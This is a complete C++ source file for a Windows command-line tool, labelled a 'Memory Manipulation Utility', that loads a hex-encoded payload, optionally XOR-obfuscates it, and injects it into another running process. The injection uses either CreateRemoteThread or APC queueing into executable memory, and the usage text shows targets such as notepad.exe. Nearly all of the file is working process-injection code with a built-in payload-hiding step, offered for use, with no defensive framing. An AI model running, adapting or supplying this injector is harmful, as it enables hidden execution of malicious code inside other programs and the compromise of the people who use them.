#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>
#include <windows.h>
#include <tlhelp32.h>
#include <ctime>
#include <sstream>
#include <random>
#include <iomanip>

// Function prototypes
std::vector<unsigned char> ReadHexFile(const std::string& filename);
bool WriteHexFile(const std::string& filename, const std::vector<unsigned char>& data);
bool InjectIntoProcess(DWORD processId, const std::vector<unsigned char>& payload);
bool InjectIntoProcessUsingAPC(DWORD processId, const std::vector<unsigned char>& payload);
void DisplayUsageInstructions(const char* programName);
std::string GenerateRandomString(size_t length);
std::vector<unsigned char> StringToBytes(const std::string& input);
DWORD GetProcessIdByName(const std::string& processName);
void PrintHex(const std::vector<unsigned char>& data, size_t maxBytes = 16);
bool ValidatePayload(const std::vector<unsigned char>& data);
void XORData(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len);

// Read hex content from file
std::vector<unsigned char> ReadHexFile(const std::string& filename) {
    std::vector<unsigned char> result;
    std::ifstream file(filename);
    if (!file) {
        std::cerr << "[!] Error: Cannot open file: " << filename << std::endl;
        return result;
    }

    std::string line;
    while (std::getline(file, line)) {
        line.erase(std::remove_if(line.begin(), line.end(), ::isspace), line.end());
        for (size_t i = 0; i < line.length(); i += 2) {
            if (i + 1 >= line.length()) break;
            std::string byteStr = line.substr(i, 2);
            try {
                unsigned char byte = static_cast<unsigned char>(std::stoi(byteStr, nullptr, 16));
                result.push_back(byte);
            }
            catch (...) {
                std::cerr << "[!] Warning: Invalid hex byte: " << byteStr << std::endl;
            }
        }
    }
    std::cout << "[+] Read " << result.size() << " bytes from " << filename << std::endl;
    return result;
}

// Write bytes to file in hex format
bool WriteHexFile(const std::string& filename, const std::vector<unsigned char>& data) {
    std::ofstream file(filename);
    if (!file) {
        std::cerr << "[!] Error: Cannot open file for writing: " << filename << std::endl;
        return false;
    }

    for (size_t i = 0; i < data.size(); ++i) {
        file << std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(data[i]);
        if ((i + 1) % 16 == 0) file << std::endl;
    }
    if (data.size() % 16 != 0) file << std::endl;

    std::cout << "[+] Wrote " << data.size() << " bytes to " << filename << std::endl;
    return true;
}

// XOR encryption/decryption function
void XORData(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len) {
    if (key_len == 0) return; // Prevent division by zero

    std::cout << "[+] Applying XOR with key length: " << key_len << " bytes" << std::endl;
    for (size_t i = 0; i < data_len; ++i) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

// Inject payload into target process
bool InjectIntoProcess(DWORD processId, const std::vector<unsigned char>& payload) {
    if (payload.empty()) {
        std::cerr << "[!] Error: Empty payload" << std::endl;
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cerr << "[!] Failed to open process " << processId << ", error: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::cerr << "[!] Memory allocation failed, error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteMemory, payload.data(), payload.size(), &bytesWritten) || bytesWritten != payload.size()) {
        std::cerr << "[!] Failed to write payload, wrote " << bytesWritten << "/" << payload.size() << " bytes, error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "[!] Failed to create remote thread, error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Successfully injected payload into process " << processId << std::endl;
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

// Alternate injection method using APC (Asynchronous Procedure Call)
bool InjectIntoProcessUsingAPC(DWORD processId, const std::vector<unsigned char>& payload) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cerr << "[!] Failed to open process " << processId << ", error: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory for the payload
    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::cerr << "[!] Memory allocation failed, error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the payload to process memory
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteMemory, payload.data(), payload.size(), &bytesWritten) || bytesWritten != payload.size()) {
        std::cerr << "[!] Failed to write payload, wrote " << bytesWritten << "/" << payload.size() << " bytes, error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Find a thread in the process to queue APC
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Failed to create thread snapshot, error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
    bool apcQueued = false;

    if (Thread32First(hSnapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processId) {
                HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
                if (hThread) {
                    std::cout << "[+] Queueing APC to thread ID: " << threadEntry.th32ThreadID << std::endl;
                    if (QueueUserAPC((PAPCFUNC)remoteMemory, hThread, NULL)) {
                        apcQueued = true;
                    }
                    else {
                        std::cerr << "[!] Failed to queue APC, error: " << GetLastError() << std::endl;
                    }
                    CloseHandle(hThread);
                    if (apcQueued) break;
                }
            }
        } while (Thread32Next(hSnapshot, &threadEntry));
    }

    CloseHandle(hSnapshot);

    if (!apcQueued) {
        std::cerr << "[!] Failed to queue APC to any thread" << std::endl;
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Successfully injected payload using APC into process " << processId << std::endl;
    CloseHandle(hProcess);
    return true;
}

// Validate payload (basic check for executable code)
bool ValidatePayload(const std::vector<unsigned char>& data) {
    if (data.empty()) return false;

    // Check for common executable signatures (e.g., PE header for Windows)
    if (data.size() >= 2 && data[0] == 0x4D && data[1] == 0x5A) {
        std::cout << "[+] Payload appears to be a valid PE executable" << std::endl;
        return true;
    }

    // Basic entropy check to avoid random or zeroed data
    std::vector<int> freq(256, 0);
    for (unsigned char c : data) {
        freq[c]++;
    }
    double entropy = 0.0;
    for (int f : freq) {
        if (f > 0) {
            double p = static_cast<double>(f) / data.size();
            entropy -= p * log2(p);
        }
    }
    if (entropy < 2.0) {
        std::cerr << "[!] Warning: Payload has low entropy (" << entropy << "), possibly invalid" << std::endl;
        return false;
    }

    std::cout << "[+] Payload entropy: " << entropy << " (likely valid)" << std::endl;
    return true;
}

// Get process ID by name
DWORD GetProcessIdByName(const std::string& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Failed to create process snapshot, error: " << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
    if (!Process32First(snapshot, &processEntry)) {
        std::cerr << "[!] Failed to enumerate processes, error: " << GetLastError() << std::endl;
        CloseHandle(snapshot);
        return 0;
    }

    std::wstring wProcessName(processName.begin(), processName.end());
    do {
        if (_wcsicmp(processEntry.szExeFile, wProcessName.c_str()) == 0) {
            DWORD pid = processEntry.th32ProcessID;
            CloseHandle(snapshot);
            return pid;
        }
    } while (Process32Next(snapshot, &processEntry));

    CloseHandle(snapshot);
    std::cerr << "[!] Process not found: " << processName << std::endl;
    return 0;
}

// Display usage instructions
void DisplayUsageInstructions(const char* programName) {
    std::cout << "Memory Manipulation Utility\n"
        << "==========================\n"
        << "Usage: " << programName << " [options]\n\n"
        << "Options:\n"
        << "  -i <file>     : Input file with hex-encoded payload\n"
        << "  -p <pid/name> : Target process ID or name\n"
        << "  -x <key>      : XOR key for decryption (optional)\n"
        << "  -a            : Use APC injection instead of CreateRemoteThread (optional)\n"
        << "  -e <file>     : Encrypt input file with XOR key and save to new file (do not inject)\n"
        << "  -h            : Show this help\n\n"
        << "Examples:\n"
        << "  " << programName << " -i payload.hex -p notepad.exe       # Inject raw payload\n"
        << "  " << programName << " -e payload.hex -x secretkey -i encrypted.hex  # Encrypt payload\n"
        << "  " << programName << " -i encrypted.hex -p 1234 -x secretkey  # Inject encrypted payload\n";
}

// Generate random string
std::string GenerateRandomString(size_t length) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(charset) - 2);

    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        result += charset[dis(gen)];
    }
    return result;
}

// Convert string to bytes
std::vector<unsigned char> StringToBytes(const std::string& input) {
    return std::vector<unsigned char>(input.begin(), input.end());
}

// Print hex dump
void PrintHex(const std::vector<unsigned char>& data, size_t maxBytes) {
    for (size_t i = 0; i < data.size() && i < maxBytes; ++i) {
        std::cout << std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(data[i]) << " ";
    }
    std::cout << std::dec << std::endl;
}

int main(int argc, char* argv[]) {
    std::string inputFile, processTarget, xorKey, encryptOutputFile;
    bool useAPC = false;
    bool encryptMode = false;

    // Parse command-line arguments
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-i" && i + 1 < argc) inputFile = argv[++i];
        else if (arg == "-p" && i + 1 < argc) processTarget = argv[++i];
        else if (arg == "-x" && i + 1 < argc) xorKey = argv[++i];
        else if (arg == "-a") useAPC = true;
        else if (arg == "-e" && i + 1 < argc) {
            encryptMode = true;
            encryptOutputFile = argv[++i];
        }
        else if (arg == "-h") { DisplayUsageInstructions(argv[0]); return 0; }
        else { std::cerr << "[!] Unknown option: " << arg << std::endl; DisplayUsageInstructions(argv[0]); return 1; }
    }

    // Validate required arguments
    if (inputFile.empty()) {
        std::cerr << "[!] Error: Specify input file (-i)" << std::endl;
        DisplayUsageInstructions(argv[0]);
        return 1;
    }

    // Load payload
    std::vector<unsigned char> payload = ReadHexFile(inputFile);

    if (payload.empty()) {
        std::cerr << "[!] Error: Failed to load payload from " << inputFile << std::endl;
        return 1;
    }

    std::cout << "[+] Payload loaded (" << payload.size() << " bytes): ";
    PrintHex(payload);

    if (encryptMode) {
        // Encrypt mode - encrypt payload and save to file
        if (xorKey.empty()) {
            std::cerr << "[!] Error: XOR key is required for encryption (-x)" << std::endl;
            return 1;
        }

        // Create a copy of the payload for encryption
        std::vector<unsigned char> encryptedPayload = payload;

        // Apply XOR encryption
        std::vector<unsigned char> key = StringToBytes(xorKey);
        XORData(encryptedPayload.data(), encryptedPayload.size(), key.data(), key.size());

        std::cout << "[+] XOR encryption applied with key: " << xorKey << std::endl;
        std::cout << "[+] Encrypted payload: ";
        PrintHex(encryptedPayload);

        // Save to output file
        if (!WriteHexFile(encryptOutputFile, encryptedPayload)) {
            std::cerr << "[!] Error: Failed to write encrypted payload to " << encryptOutputFile << std::endl;
            return 1;
        }

        std::cout << "[+] Encrypted payload saved to " << encryptOutputFile << std::endl;
        return 0;
    }
    else {
        // Injection mode - validate process target
        if (processTarget.empty()) {
            std::cerr << "[!] Error: Specify target process (-p)" << std::endl;
            DisplayUsageInstructions(argv[0]);
            return 1;
        }

        // Apply XOR decryption if a key is provided
        if (!xorKey.empty()) {
            std::cout << "[+] XOR key provided, treating payload as encrypted..." << std::endl;

            // Create a copy of the payload for decryption
            std::vector<unsigned char> decryptedPayload = payload;

            // Apply XOR decryption
            std::vector<unsigned char> key = StringToBytes(xorKey);
            XORData(decryptedPayload.data(), decryptedPayload.size(), key.data(), key.size());

            std::cout << "[+] XOR decryption applied with key: " << xorKey << std::endl;
            std::cout << "[+] Decrypted payload: ";
            PrintHex(decryptedPayload);

            // Use the decrypted payload for injection
            payload = decryptedPayload;
        }

        // Validate payload
        if (!ValidatePayload(payload)) {
            std::cerr << "[!] Error: Invalid payload detected" << std::endl;
            return 1;
        }

        // Resolve process ID
        DWORD processId = 0;
        try {
            processId = std::stoul(processTarget);
            std::cout << "[+] Targeting process ID: " << processId << std::endl;
        }
        catch (...) {
            processId = GetProcessIdByName(processTarget);
            if (processId == 0) {
                std::cerr << "[!] Error: Process not found: " << processTarget << std::endl;
                return 1;
            }
            std::cout << "[+] Resolved process " << processTarget << " to ID: " << processId << std::endl;
        }

        // Inject payload
        bool success = false;
        if (useAPC) {
            success = InjectIntoProcessUsingAPC(processId, payload);
        }
        else {
            success = InjectIntoProcess(processId, payload);
        }

        if (!success) {
            std::cerr << "[!] Injection failed" << std::endl;
            return 1;
        }

        std::cout << "[+] Operation completed successfully" << std::endl;
        return 0;
    }
}